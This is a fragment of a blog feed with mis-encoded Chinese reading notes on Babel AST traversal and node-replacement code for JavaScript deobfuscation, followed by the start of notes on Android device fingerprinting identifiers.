js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> updateParamNameVisitor=&#123;</span><br><span class="line">    <span class="title class_">Identifier</span>(path)&#123;</span><br><span class="line">        <span class="keyword">if</span>(path.<span class="property">node</span>.<span class="property">name</span> === <span class="variable language_">this</span>.<span class="property">paramName</span>)&#123;</span><br><span class="line">            path.<span class="property">node</span>.<span class="property">name</span>=<span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> visitor=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>(path)&#123;</span><br><span class="line">        <span class="keyword">const</span> paramName=path.<span class="property">node</span>.<span class="property">params</span>[<span class="number">0</span>].<span class="property">name</span>;<span class="comment">//å–å‡ºå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°å</span></span><br><span class="line">        path.<span class="title function_">traverse</span>(updateParamNameVisitor,&#123;</span><br><span class="line">            paramName</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor)ï¼›</span><br></pre></td></tr></table></figure><p>è§£æï¼šå…ˆç”¨traverseæ ¹æ®visitorå»éå†æ‰€æœ‰èŠ‚ç‚¹ï¼Œå½“éå†åˆ° FunctionExpressionèŠ‚ç‚¹ï¼Œç”¨path.traverseæ ¹æ®updateParamNameVisitorå»éå†å½“å‰èŠ‚ç‚¹ä¸‹æ‰€æœ‰å­èŠ‚ç‚¹ï¼Œç„¶åä¿®æ”¹ä¸å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°ç›¸åŒçš„æ ‡è¯†ç¬¦ï¼Œåœ¨ä½¿ç”¨ path.traverseè¿˜å¯ä»¥ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨å¯¹åº”çš„visitorä¸­ç”¨thiså¼•ç”¨å®ƒ</p><h3 id="typeç»„ä»¶">typeç»„ä»¶</h3><p>è¯¥ç»„ä»¶ä¸»è¦ç”¨æ¥åˆ¤æ–­èŠ‚ç‚¹çš„ç±»å‹ï¼Œç”Ÿæˆæ–°çš„èŠ‚ç‚¹ç­‰ã€‚</p><p>t.isIdentifier(path.node)ï¼Œç­‰åŒäºpath.node.type === â€œIdentifierâ€,è¿˜å¯ä»¥å†åˆ¤æ–­ç±»å‹çš„åŒæ—¶é™„åŠ æ¡ä»¶ï¼Œå¦‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">    <span class="title function_">enter</span>(<span class="params">path</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(path.<span class="property">node</span>.<span class="property">type</span> === <span class="string">&quot;Identifier&quot;</span> &amp;&amp; path.<span class="property">node</span>.<span class="property">name</span>===<span class="string">&quot;n&quot;</span>)&#123;</span><br><span class="line">path.<span class="property">node</span>.<span class="property">name</span>=<span class="string">&quot;x&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç­‰åŒäº</span></span><br><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">    <span class="title function_">enter</span>(<span class="params">path</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(t.<span class="title function_">isIdentifier</span>(path.<span class="property">node</span>ï¼Œ&#123;<span class="attr">name</span>:<span class="string">&#x27;n&#x27;</span>&#125;))&#123;</span><br><span class="line">path.<span class="property">node</span>.<span class="property">name</span>=<span class="string">&quot;x&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¦‚æœè¦åˆ¤æ–­å…¶ä»–ç±»å‹ï¼Œåªéœ€è¦æ”¹isåé¢çš„ç±»å‹ã€‚</p><p>å½“èŠ‚ç‚¹ä¸ç¬¦åˆè¦æ±‚ï¼ŒæŠ›å‡ºé”™è¯¯</p><p>```t.assertBinaryExpression(nodeå¯¹è±¡)` æ˜¯ä¸€ç§æ–­è¨€å·¥å…·ï¼Œç”¨äºæ£€æŸ¥ä¼ å…¥çš„èŠ‚ç‚¹æ˜¯å¦æ˜¯ äºŒå…ƒè¡¨è¾¾å¼ï¼ˆBinaryExpressionï¼‰ã€‚``</p><p><code>t.assertBinaryExpression(maybeBinaryExpressionNode,&#123;operator:&quot;*&quot;&#125;); åˆ¤æ–­æ˜¯å¦æ˜¯äºŒé¡¹å¼å¹¶ä¸”æ“ä½œç¬¦æ˜¯*</code></p><h2 id="Pathå¯¹è±¡è¯¦è§£">Pathå¯¹è±¡è¯¦è§£</h2><h3 id="Pathä¸NodeåŒºåˆ«">Pathä¸NodeåŒºåˆ«</h3><p><code>path.stop</code>ï¼šåœæ­¢éå†èŠ‚ç‚¹ ä¸Babelä¸­çš„<code>path.skip</code>ç±»ä¼¼</p><p>path.nodeèƒ½å–å‡ºæŸç±»å‹çš„nodeå¯¹è±¡ï¼ŒèŠ‚ç‚¹æ˜¯Pathçš„ä¸€éƒ¨åˆ†ï¼ŒPathæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œç”¨æ¥æè¿°ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„è¿æ¥</p><h3 id="Pathä¸­çš„æ–¹æ³•">Pathä¸­çš„æ–¹æ³•</h3><h4 id="è·å–å­èŠ‚ç‚¹-path">è·å–å­èŠ‚ç‚¹/path</h4><p>ä¸ºäº†å¾—åˆ°astèŠ‚ç‚¹çš„å±æ€§å€¼ï¼Œä¸€èˆ¬å…ˆè®¿é—®åˆ°è¯¥èŠ‚ç‚¹ï¼Œç„¶ååˆ©ç”¨path.node.propertyè·å–å±æ€§(propertyä»£æŒ‡æŸä¸ªå±æ€§å)ï¼Œå¦‚path.node.rightï¼Œpath.node.leftï¼Œpath.node.operatorï¼Œé€šè¿‡è¿™ä¸ªæ–¹æ³•è·å¾—çš„æ˜¯Nodeæˆ–è€…å…·ä½“å±æ€§å€¼ã€‚</p><p>Nodeä¸èƒ½ä½¿ç”¨Pathçš„æ–¹æ³•ï¼Œå¦‚æœè¦è·å¾—è¯¥å±æ€§çš„Pathï¼Œä½¿ç”¨path.get(â€œå±æ€§å å­—ç¬¦ä¸²å½¢å¼â€)</p><p>ä»»ä½•å½¢å¼å±æ€§å€¼ï¼Œé€šè¿‡path.getå»è·å–ï¼Œéƒ½ä¼šåŒ…è£…ä¸ºPathå¯¹è±¡å†è¿”å›ï¼Œåƒname,operatorè¿™ä¸€ç±»å°±æ²¡å¿…è¦åŒ…è£…</p><h4 id="åˆ¤æ–­Pathç±»å‹">åˆ¤æ–­Pathç±»å‹</h4><p><img src="/posts/95017dfa.htm/image-20241115203344621.png" alt="image-20241115203344621"></p><h4 id="èŠ‚ç‚¹è½¬ä»£ç ">èŠ‚ç‚¹è½¬ä»£ç </h4><p>generatorç»„ä»¶å¯ä»¥æŠŠastä»£ç ä¸­çš„ä¸€éƒ¨åˆ†èŠ‚ç‚¹è½¬ä¸ºä»£ç ï¼Œè¿™å¯¹èŠ‚ç‚¹éå†è¿‡ç¨‹ä¸­çš„è°ƒè¯•æœ‰å¸®åŠ©</p><h4 id="æ›¿æ¢èŠ‚ç‚¹å±æ€§">æ›¿æ¢èŠ‚ç‚¹å±æ€§</h4><p>æ›¿æ¢èŠ‚ç‚¹å±æ€§ä¸è·å–èŠ‚ç‚¹å±æ€§æ–¹æ³•ç›¸åŒï¼Œåªæ˜¯æ”¹ä¸ºèµ‹å€¼ï¼Œä½†ä¹Ÿä¸æ˜¯éšæ„æ›¿æ¢ï¼Œéœ€æ³¨æ„ï¼Œæ›¿æ¢çš„ç±»å‹è¦åœ¨å…è®¸çš„ç±»å‹èŒƒå›´å†…</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor3=&#123;</span><br><span class="line">    <span class="title class_">BinaryExpression</span>:&#123;</span><br><span class="line">        <span class="title function_">enter</span>(<span class="params">path</span>)&#123;</span><br><span class="line">            path.<span class="property">node</span>,left=t.<span class="title function_">identifier</span>(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">            path.<span class="property">node</span>,right=t.<span class="title function_">identifier</span>(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">&#125;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="æ›¿æ¢æ•´ä¸ªèŠ‚ç‚¹">æ›¿æ¢æ•´ä¸ªèŠ‚ç‚¹</h4><p>Pathä¸­ä¸æ›¿æ¢ç›¸å…³çš„æ–¹æ³•ï¼šreplaceWith,replaceWithMultiple,replaceInline,replaceWithSourceString</p><p>replaceWith,æ˜¯ç”¨ä¸€ä¸ªèŠ‚ç‚¹æ›¿æ¢å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸¥æ ¼ä¸€æ¢ä¸€</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor=&#123;</span><br><span class="line">    <span class="title class_">BinaryExpression</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">replaceWith</span>(t.<span class="title function_">valueToNode</span>(<span class="string">&quot;xxxx&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor);</span><br></pre></td></tr></table></figure><p>replaceWithMultipleä¹Ÿæ˜¯èŠ‚ç‚¹æ¢èŠ‚ç‚¹ï¼Œä¸è¿‡æ˜¯å¤šæ¢ä¸€</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor=&#123;</span><br><span class="line">    <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">replaceWithMultiple</span>([</span><br><span class="line">            t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;xxx&quot;</span>)),</span><br><span class="line">            t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">numericLiteral</span>(<span class="number">1000</span>)),</span><br><span class="line">            t.<span class="title function_">returnStatement</span>(),</span><br><span class="line">        ]);</span><br><span class="line">       path.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor);</span><br></pre></td></tr></table></figure><p>ä»£ç è§£æï¼šå½“è¡¨è¾¾å¼è¯­å¥å•ç‹¬åœ¨ä¸€è¡Œ(æ²¡æœ‰èµ‹å€¼)ï¼Œæœ€å¥½ç”¨expressionStatementåŒ…è£¹ï¼Œæ›¿æ¢åçš„èŠ‚ç‚¹ï¼Œtraverseä¹Ÿèƒ½éå†åˆ°ã€‚</p><p>replaceInlineæ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œå¦‚æœå‚æ•°ä¸æ˜¯æ•°ç»„ï¼Œé‚£ä¹ˆreplaceInlineç­‰åŒäºreplaceWithï¼›å¦‚æœæ˜¯æ•°ç»„ï¼Œåˆ™ç­‰åŒäºreplaceWithMultipleï¼Œå…¶ä¸­çš„æ•°ç»„æˆå‘˜å¿…é¡»æ˜¯èŠ‚ç‚¹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor=&#123;</span><br><span class="line">    <span class="title class_">StringLiteral</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">replaceInline</span>(</span><br><span class="line">        t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;1111&quot;</span>));</span><br><span class="line">        path.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">replaceInline</span>([</span><br><span class="line">            t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;xxx&quot;</span>)),</span><br><span class="line">            t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">numericLiteral</span>(<span class="number">1000</span>)),</span><br><span class="line">            t.<span class="title function_">returnStatement</span>(),</span><br><span class="line">        ]);</span><br><span class="line">       path.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor);</span><br></pre></td></tr></table></figure><p>replaceWithSourceString()ï¼šç”¨å­—ç¬¦ä¸²æºç æ›¿æ¢èŠ‚ç‚¹ï¼Œå¦‚æŠŠåŸå§‹ä»£ç ä¸­çš„å‡½æ•°æ”¹ä¸ºé—­åŒ…å½¢å¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">    <span class="title class_">RertuenStatement</span>(path)&#123;</span><br><span class="line">        <span class="keyword">let</span> argumentPath=path.<span class="title function_">get</span>(<span class="string">&#x27;argument&#x27;</span>);</span><br><span class="line">        argumentPath.<span class="title function_">replaceWithSourceString</span>(</span><br><span class="line">            <span class="string">&#x27;function()&#123;return&#x27;</span>+argumentPath+<span class="string">&#x27;&#125;()&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        path.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="åˆ é™¤èŠ‚ç‚¹">åˆ é™¤èŠ‚ç‚¹</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">    <span class="title class_">EmptyStatement</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">remove</span>(); <span class="comment">//åˆ é™¤å½“å‰èŠ‚ç‚¹</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>EmptyStatementæŒ‡çš„æ˜¯ç©ºè¯­å¥ï¼Œå°±æ˜¯å¤šä½™çš„åˆ†å·ã€‚</p><h4 id="æ’å…¥èŠ‚ç‚¹">æ’å…¥èŠ‚ç‚¹</h4><p>æƒ³è¦æŠŠèŠ‚ç‚¹æ’å…¥åˆ°å…„å¼ŸèŠ‚ç‚¹ä¸­ï¼Œå¯ä»¥ä½¿ç”¨insertBeforeå’ŒinsertAfteråˆ†åˆ«åœ¨å½“å‰èŠ‚ç‚¹å‰åæ’å…¥ç»“ç‚¹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">   <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">insertBefore</span>(t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;before&quot;</span>))); </span><br><span class="line">       path.<span class="title function_">insertAfter</span>(t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;after&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="çˆ¶çº§Path">çˆ¶çº§Path</h3><p>Pathå¯¹è±¡ä¸­æœ‰parentPathå’Œparentä¸¤ä¸ªå±æ€§ï¼Œå…¶ä¸­parentPathç±»å‹ä¸ºNodePathï¼Œä»–æ˜¯çˆ¶çº§Pathï¼Œparentç±»å‹ä¸ºNodeï¼Œä»–æ˜¯çˆ¶èŠ‚ç‚¹ã€‚</p><p>çˆ¶çº§Pathè·å–ï¼špath.parentPathï¼Œpath.parentPath.nodeç­‰åŒäºpath.parentã€‚</p><h4 id="path-findParent">path.findParent</h4><p>ä¸ªåˆ«æƒ…å†µä¸‹ï¼Œéœ€è¦ä»ä¸€ä¸ªè·¯å¾„å‘ä¸Šéå†è¯­æ³•æ ‘ï¼Œç›´åˆ°æ»¡è¶³ç›¸åº”çš„æ¡ä»¶ï¼Œè¿™æ—¶å¯ä»¥ä½¿ç”¨findParentã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">   <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(path.<span class="title function_">findParent</span>(<span class="function">(<span class="params">p</span>)=&gt;</span>p.<span class="title function_">isObjectExpression</span>()));</span><br><span class="line">       <span class="comment">//path.findParent(function(p)&#123;return p.isObjectExpression()&#125;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//éå†returnstatementï¼Œç„¶åå‘ä¸Šæ‰¾çˆ¶çº§Pathï¼Œå½“æ‰¾åˆ°pathå¯¹è±¡ç±»å‹ä¸ºObjectExpression,è¿”å›è¯¥pathå¯¹è±¡</span></span><br></pre></td></tr></table></figure><p>Pathå¯¹è±¡çš„findParentæ¥æ”¶ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œåœ¨å‘ä¸Šéå†æ¯ä¸€ä¸ªçˆ¶çº§pathæ—¶ï¼Œä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå¹¶ä¼ å…¥å¯¹åº”çˆ¶çº§pathå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå½“è¯¥å›è°ƒå‡½æ•°è¿”å›çœŸå€¼æ—¶ï¼Œåˆ™å°†å¯¹åº”çš„çˆ¶çº§pathå¯¹è±¡è¿”å›ï¼Œ</p><h4 id="path-find">path.find</h4><p>ä½¿ç”¨ä¸findParentä¸€è‡´ï¼Œåªä¸è¿‡findæŸ¥æ‰¾èŒƒå›´åŒ…æ‹¬å½“å‰èŠ‚ç‚¹ï¼Œ</p><h4 id="path-getFunctionParent">path.getFunctionParent</h4><p>å‘ä¸ŠæŸ¥æ‰¾ä¸å½“å‰èŠ‚ç‚¹æœ€æ¥è¿‘çš„çˆ¶å‡½æ•°ï¼Œè¿”å›çš„ä¹Ÿæ˜¯pathå¯¹è±¡</p><h4 id="path-getStatementParent">path.getStatementParent</h4><p>å‘ä¸Šéå†è¯­æ³•æ ‘ç›´åˆ°æ‰¾åˆ°è¯­å¥çˆ¶èŠ‚ç‚¹ï¼Œä¾‹å¦‚ï¼Œå£°æ˜è¯­å¥ï¼Œreturnè¯­å¥ï¼Œifè¯­å¥ï¼Œwhichè¯­å¥å’Œwhileè¯­å¥ï¼Œè¿”å›çš„ä¹Ÿæ˜¯pathå¯¹è±¡ï¼Œè¯¥æ–¹æ³•ä»å½“å‰èŠ‚ç‚¹æ‰¾ï¼Œå¦‚æœæƒ³è¦æ‰¾åˆ°returnè¯­å¥çˆ¶è¯­å¥ï¼Œä»parentPathä¸­è°ƒç”¨</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">   <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(path.<span class="property">parentPath</span>.<span class="property">getStatementParent</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="çˆ¶çº§pathå…¶ä»–æ–¹æ³•">çˆ¶çº§pathå…¶ä»–æ–¹æ³•</h4><p>ä¸ä¹‹å‰ä»‹ç»ç±»ä¼¼ï¼Œå¦‚æ›¿æ¢çˆ¶èŠ‚ç‚¹path.parentPath.replaceWith(Node)</p><p>å’Œåˆ é™¤çˆ¶èŠ‚ç‚¹(path.parentPath.remove)</p>]]></content>
    
    
    <summary type="html">ğŸ¥’é˜…è¯»ã€Šåçˆ¬è™«ASTåŸç†ä¸è¿˜åŸæ··æ·†å®æˆ˜ã€‹è®°å½•çš„ä¸€äº›å°ä¸œè¥¿</summary>
    
    
    
    <category term="é˜…è¯»" scheme="https://zxk1ng.github.io/categories/%E9%98%85%E8%AF%BB/"/>
    
    
    <category term="AST" scheme="https://zxk1ng.github.io/tags/AST/"/>
    
    <category term="JSé€†å‘" scheme="https://zxk1ng.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
    <category term="çˆ¬è™«" scheme="https://zxk1ng.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
    <category term="é˜…è¯»" scheme="https://zxk1ng.github.io/tags/%E9%98%85%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>ã€ŠAppå®‰å…¨å®æˆ˜æŒ‡å—ã€‹é˜…è¯»ç¬”è®°</title>
    <link href="https://zxk1ng.github.io/posts/cf804d4e.html"/>
    <id>https://zxk1ng.github.io/posts/cf804d4e.html</id>
    <published>2025-01-15T06:52:11.000Z</published>
    <updated>2025-01-15T07:14:39.059Z</updated>
    
    <content type="html"><![CDATA[<h1>ã€ŠAppå®‰å…¨å®æˆ˜æŒ‡å—ã€‹ç¬”è®°å½•</h1><h2 id="è®¾å¤‡æŒ‡çº¹">è®¾å¤‡æŒ‡çº¹</h2><ul><li>è®¾å¤‡æŒ‡çº¹æ˜¯æŒ‡å¯ä»¥ç”¨äºå”¯ä¸€è¯†åˆ«å‡ºè¯¥è®¾å¤‡çš„è®¾å¤‡ç‰¹å¾æˆ–è€…æ ‡è¯†ã€‚è®¾å¤‡æŒ‡çº¹ä½œä¸ºå¯¹ç«¯è®¾å¤‡é£é™©è¯†åˆ«çš„é‡è¦å› ç´ ï¼Œä¹Ÿé€æ­¥ä»ç®€å•çš„è®¾å¤‡IDå‘å±•ä¸ºç»“åˆè®¾å¤‡IDï¼Œé£é™©ç¯å¢ƒæ£€æµ‹åŠè®¾å¤‡è¡Œä¸ºåˆ†æç­‰å¤šä¸ªç»´åº¦çš„ä¿¡æ¯æ¥è¯†åˆ«å½“å‰è®¾å¤‡IDçš„çœŸå®æ€§ã€‚<br>è®¾å¤‡æŒ‡çº¹ç”±è®¾å¤‡å›ºæœ‰çš„ï¼Œéš¾ä»¥ç¯¡æ”¹çš„ï¼Œå”¯ä¸€çš„è®¾å¤‡å‚æ•°ç”Ÿæˆã€‚<br>è®¾å¤‡æŒ‡çº¹é€šå¸¸ä½¿ç”¨è®¾å¤‡çš„IMEIï¼Œè®¾å¤‡åºåˆ—å·ï¼ŒMACåœ°å€ï¼Œå¹¿å‘Šè¿½è¸ªæ ‡è¯†ç­‰è®¾å¤‡ç¡¬è½¯ä»¶ä¿¡æ¯ï¼Œç»“åˆæœåŠ¡ç«¯ç®—æ³•è®¡ç®—è®¾å¤‡å”¯ä¸€IDï¼Œä¿è¯åœ¨ç”¨æˆ·é‡è£…åº”ç”¨ï¼Œå‡çº§ç³»ç»Ÿç­‰æƒ…å†µä¸‹ä¾æ—§æœ‰å”¯ä¸€æ€§ã€‚</li></ul><h3 id="è®¾å¤‡æŒ‡çº¹ç³»ç»Ÿ">è®¾å¤‡æŒ‡çº¹ç³»ç»Ÿ</h3><p>è®¾å¤‡æŒ‡çº¹å¹¶ä¸ä»…è¦åœ¨å®¢æˆ·ç«¯é‡‡é›†è®¾å¤‡æ•°æ®åç”Ÿæˆä¸€æ¡è®¾å¤‡æ ‡è¯†å­—ç¬¦ä¸²ï¼Œè¿˜éœ€è¦ä¾é ä¸€æ•´å¥—çš„è®¾å¤‡æŒ‡çº¹ç³»ç»Ÿä¿è¯å…¶å”¯ä¸€æ€§å’Œç¨³å®šæ€§ã€‚</p><p>è®¾å¤‡æŒ‡çº¹ç³»ç»Ÿåˆ†ä¸ºä¸¤ä¸ªæ¨¡å—ï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡è´¹ã€‚</p><p><strong>å®¢æˆ·ç«¯</strong>è´Ÿè´£é‡‡é›†è®¾å¤‡çš„ç‰¹å¾å±æ€§ï¼Œå°†é‡‡é›†çš„åŸå§‹è®¾å¤‡æ•°æ®éšè—åˆ°è®¾å¤‡æœ¬åœ°ä¸€ä»½ï¼ŒåŒæ—¶ä¸Šä¼ åˆ°æœåŠ¡ç«¯ä¸€ä»½ã€‚<strong>æœåŠ¡ç«¯</strong>æ¥æ”¶å®¢æˆ·ç«¯ä¸Šä¼ çš„åŸå§‹è®¾å¤‡æ•°æ®ï¼Œä½¿ç”¨è®¾å¤‡å‚æ•°æŸ¥è¯¢è®¾å¤‡åº“ã€‚å¦‚æœè®¾å¤‡æŒ‡çº¹åº“ä¸­å·²ç»æœ‰è¯¥è®¾å¤‡çš„è®¾å¤‡æŒ‡çº¹åˆ™ç›´æ¥å°†å…¶ä¸‹å‘åˆ°å®¢æˆ·ç«¯ï¼Œå¦‚æœè®¾å¤‡åº“ä¸­æœªæŸ¥è¯¢åˆ°è¯¥è®¾å¤‡æŒ‡çº¹ï¼Œåˆ™é€šè¿‡è®¾å¤‡æŒ‡çº¹ç®—æ³•ç”Ÿæˆå”¯ä¸€æ ‡è¯†è®¾å¤‡çš„è®¾å¤‡æŒ‡çº¹ï¼Œå¹¶å°†å…¶ä¸‹å‘å®¢æˆ·ç«¯ã€‚</p><h3 id="è®¾å¤‡æ•°æ®é‡‡é›†">è®¾å¤‡æ•°æ®é‡‡é›†</h3><p>ç¨³å®šæ€§å’Œå”¯ä¸€æ€§æ˜¯è®¾å¤‡æŒ‡çº¹æ‰€å¿…é¡»çš„ç‰¹æ€§ï¼Œå› æ­¤ç”Ÿæˆè®¾å¤‡æŒ‡çº¹æ‰€é€‰æ‹©çš„è®¾å¤‡å‚æ•°ä¹Ÿéœ€è¦æœ‰è¿™ä¸¤ä¸ªç‰¹æ€§ã€‚</p><p>androidè®¾å¤‡</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å­—æ®µåç§°              å­—æ®µå«ä¹‰                 ç‰¹æ€§</span><br><span class="line">imei/meid            å›½é™…ç§»åŠ¨è®¾å¤‡è¯†åˆ«ç         ç›¸åŒå‚å•†åŒå‹å·è®¾å¤‡å­˜åœ¨å°æ¦‚ç‡å‘ç”Ÿå·ç ç¢°æ’</span><br><span class="line">model                è®¾å¤‡å‹å·                 åŒå‚å•†åŒå‹å·è®¾å¤‡ï¼Œè¯¥å‚æ•°ç›¸åŒ</span><br><span class="line">screen               å±å¹•çœŸå®åˆ†è¾¨ç‡            åŒå‚å•†åŒå‹å·è®¾å¤‡ï¼Œè¯¥å‚æ•°ç›¸åŒ</span><br><span class="line"><span class="keyword">memory</span>               æ‰‹æœºå†…å­˜å¤§å°              åŒå‚å•†åŒå‹å·è®¾å¤‡ï¼Œè¯¥å‚æ•°ç›¸åŒ</span><br><span class="line">serialno             è®¾å¤‡åºåˆ—å·                ä»android11å¼€å§‹ï¼Œéœ€ç”³è¯·ç›¸åº”æƒé™ï¼ŒåŒå‹å·è®¾å¤‡å­˜åœ¨                                              å°æ¦‚ç‡å‘ç”Ÿå·ç ç¢°æ’</span><br><span class="line">drmuid               æ•°å­—ç‰ˆæƒç›¸å…³ä¸²å·          